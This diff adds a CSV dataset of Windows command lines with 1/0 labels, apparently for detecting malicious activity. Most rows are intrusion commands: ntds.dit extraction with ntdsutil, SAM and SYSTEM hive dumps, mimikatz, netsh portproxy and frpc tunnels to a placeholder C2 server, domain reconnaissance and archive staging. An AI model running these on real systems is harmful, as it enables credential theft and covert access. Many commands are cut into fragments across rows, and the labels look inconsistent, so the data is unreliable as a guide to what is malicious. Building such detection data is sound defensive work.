@@ -1,0 +1,103 @@
+Command,Label
+"C:\pstools\psexec.exe"""" {REDACTED} -s cmd.exe /c """"cmd.exe /c netsh",1
+interface portproxy delete v4tov4 listenaddress=0.0.0.0,1
+listenport=9999,1
+ntdsutil.exe snapshot “activate instance ntds”,1
+create quit quit,0
+ntdsutil.exe snapshot “ac i ntds”,1
+\cp\0.0.0.0/49275 | {redacted IP address}/8443.,1
+C:\Windows\NTDS\ntds.dit' to,1
+\\?\GLOBALROOT\Device\{redacted}VolumeShadowC,1
+opy1\Windows\NTDS\ntds.dit,1
+# Establishes a TCP tunnel to the attacker's server,1
+frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>,1
+Get-EventLog security -instanceid 4624 -after,1
+{redacted date} | fl * | Out-File,1
+C:\users\public\documents\user.dat,1
+Get-EventLog security -instanceid 4624 | Where-,1
+Object {$_.message.contains('{redacted user,1
+account}')} | select -First 1 | fl,1
+"logins.ps1"",""$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){",1
+$slogonevents = Get-Eventlog -LogName,1
+Security -ComputerName $DC.Hostname -,1
+after $startDate | where {$_.eventID -eq,1
+4624 }}/foreach ($e in $slogonevents){,1
+# Logon Successful Events,1
+# Local (Logon Type 2),1
+if (($e.EventID -eq 4624 ) -and,1
+($e.ReplacementStrings[8] -eq 2)){,1
+"write-host """"Type: Local Logon`tDate:",1
+"$e.TimeGenerated """"`tStatus:",1
+"Success`tUser: """"$e.ReplacementStrings[5]",1
+"`tWorkstation: """"$e.ReplacementStrings[11]",1
+}/if (($e.EventID -eq 4624 ) -and,1
+($e.ReplacementStrings[8] -eq 10)){,1
+"write-host """"Type: Remote Logon`tDate:",1
+"`tIP Address: """"$e.ReplacementStrings[18]",1
+"wmic.exe process call create """"ntdsutil.exe \""""ac i ntds\"""" ifm \""""create full C:\Windows\Temp\pro",1
+"wmic.exe process call create """"cmd.exe /c ntdsutil.exe \""""ac i ntds\"""" ifm \""""create full C:\Windows\Temp\Pro",1
+"wmic.exe process call create """"cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""""ac i ntds\"""" ifm \""""create full C:\Windows\Temp\tmp\ cmd.exe"""" /c wmic.exe process call create """"cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil.exe \""""ac i ntds\"""" ifm \""""create full C:\Windows\Temp\McAfee_Logs\ cmd.exe /Q /c wmic.exe process call create """"cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""""ac i ntds\"""" ifm \""""create full C:\Windows\Temp\tmp\"""" 1> \\127.0.0.1\ADMIN$\ 2>&1",1
+"cmd.exe /c """"netsh.exe interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp",1
+cmd.exe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=,1
+curl.exe www.ip-api[.]com,1
+dnscmd.exe . /enumrecords /zone {REDACTED},1
+dnscmd.exe . /enumzones,1
+dnscmd.exe /enumrecords {REDACTED} . /additional,1
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree,1
+net.exe localgroup administrators,1
+"net.exe group /dom net.exe group """"Domain Admins"""" /dom",1
+netsh.exe interface firewall show all,1
+netsh.exe interface portproxy show all,1
+netsh.exe interface portproxy show v4tov4,1
+netsh.exe firewall show all,1
+netsh.exe portproxy show v4tov4,1
+netstat -ano,1
+reg.exe query hklm\software\,1
+whoami.exe,1
+wmic.exe volume list brief,1
+wmic.exe service brief,1
+wmic.exe product list brief,1
+wmic.exe baseboard list full,1
+wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']],1
+dir C:\Users\{REDACTED}\.ssh\known_hosts,1
+dir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles,1
+mimikatz.exe,1
+reg.exe query hklm\software\OpenSSH,1
+reg.exe query hklm\software\OpenSSH\Agent,1
+reg.exe query hklm\software\realvnc,1
+reg.exe query hklm\software\realvnc\vncserver,1
+reg.exe query hklm\software\realvnc\Allusers,1
+reg.exe query hklm\software\realvnc\Allusers\vncserver,1
+reg.exe query hkcu\software\{REDACTED}\putty\session,1
+reg.exe save hklm\sam ss.dat,1
+reg.exe save hklm\system sy.dat,1
+7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z,1
+C:\Windows\system32\pcwrun.exe,1
+C:\Users\Administrator\Desktop\Win.exe,1
+C:\Windows\System32\cmdbak.exe /c ping.exe -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log,1
+"cmd.exe"""" /c dir \\127.0.0.1\C$ /od",1
+"cmd.exe"""" /c ping.exe –a –n 1 <IP address>",1
+"cmd.exe"""" /c wmic.exe /user:<username> /password:<password> process call create """"net.exe stop \""""<service name>\"""" > C:\Windows\Temp\tmp.log",1
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1,1
+net.exe use \\127.0.0.1\IPC$ /y /d,1
+powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden,1
+rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\,1
+wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd.exe /c whoami.exe,1
+xcopy.exe C:\windows\temp\hp d:\{REDACTED},1
+ftype txtfile /assoc .pl=PerlScript,1
+ftype PerlScript=perl.exe %1 %*/set PATHEXT=.pl;%PATHEXT%,0
+ftp/getmac.exe /s srvmain /u maindom\hiropln /p p@ssW23 /fo table /nh,0
+ftp/gpresult.exe /s srvmain /u maindom\hiropln /p p@ssW23 /r,0
+mklink /d \MyFolder \Users\User1\Documents,1
+mklink /h \MyFile.file \User1\Documents\example.file,1
+rd \MyFolder,1
+del \MyFile.file,0
+netstat -s -p tcp udp,0
+tftp.exe -i Host1 get boot.img,0
+xcopy.exe .\toc*.yml ..\..\Copy-To\ /S /Y,1
+rem Output example.,1
+rem .\d1\toc.yml,1
+rem .\d1\d12\toc.yml,1
+rem .\d2\toc.yml,1
+rem 3 File(s) copied,0
+"net.exe group /dom net.exe group ""Domain Admins"" /dom",1
